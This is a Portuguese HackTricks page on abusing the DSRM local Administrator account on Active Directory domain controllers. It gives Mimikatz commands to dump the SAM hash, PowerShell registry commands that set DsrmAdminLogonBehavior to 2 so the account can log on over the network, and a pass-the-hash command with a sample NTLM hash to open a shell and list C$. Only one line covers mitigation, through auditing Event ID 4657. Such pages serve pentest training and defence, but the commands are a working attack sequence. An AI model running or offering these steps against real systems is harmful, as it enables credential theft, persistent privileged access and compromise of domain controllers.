{{#include ../../banners/hacktricks-training.md}}

# Credenciais DSRM

Há uma conta de **administrador local** dentro de cada **DC**. Tendo privilégios de administrador nesta máquina, você pode usar mimikatz para **extrair o hash do Administrador local**. Em seguida, modificando um registro para **ativar esta senha** para que você possa acessar remotamente este usuário Administrador local.\
Primeiro, precisamos **extrair** o **hash** do usuário **Administrador local** dentro do DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Então precisamos verificar se essa conta funcionará, e se a chave do registro tiver o valor "0" ou não existir, você precisa **defini-la como "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Então, usando um PTH você pode **listar o conteúdo de C$ ou até mesmo obter um shell**. Note que para criar uma nova sessão do powershell com esse hash na memória (para o PTH) **o "domínio" usado é apenas o nome da máquina DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Mais informações sobre isso em: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) e [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Mitigação

- ID do Evento 4657 - Auditoria de criação/mudança de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
